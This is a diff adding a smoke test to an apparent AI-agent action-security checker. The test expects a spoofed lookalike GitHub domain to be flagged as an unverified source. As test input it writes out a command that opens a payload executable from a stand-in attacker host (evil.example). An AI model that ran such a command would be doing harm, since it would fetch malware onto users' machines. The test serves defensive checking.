@@ -634,6 +634,23 @@ def main() -> None:
             security.assess({"action_type": "run_command", "command": "winget install Git.Git"})[0] == "NEED_ADMIN",
             "Winget installs must require admin approval.",
         )
+        spoofed_url_verdict, spoofed_url_message = security.assess(
+            {
+                "action_type": "open_app",
+                "description": "open a spoofed GitHub URL",
+                "url": "https://github.com.evil.example/payload.exe",
+                "command": 'start "" "https://github.com.evil.example/payload.exe"',
+                "is_dangerous": False,
+            }
+        )
+        assert_true(
+            spoofed_url_verdict == "WARNING",
+            "Spoofed lookalike domains must not be treated as trusted sources.",
+        )
+        assert_true(
+            "unverified source" in spoofed_url_message.lower(),
+            "Spoofed lookalike domains should surface the unverified-source warning.",
+        )
         assert_true(audit_log.exists(), "Audit log was not created during smoke test.")
         audit_text = audit_log.read_text(encoding="utf-8")
         assert_true(
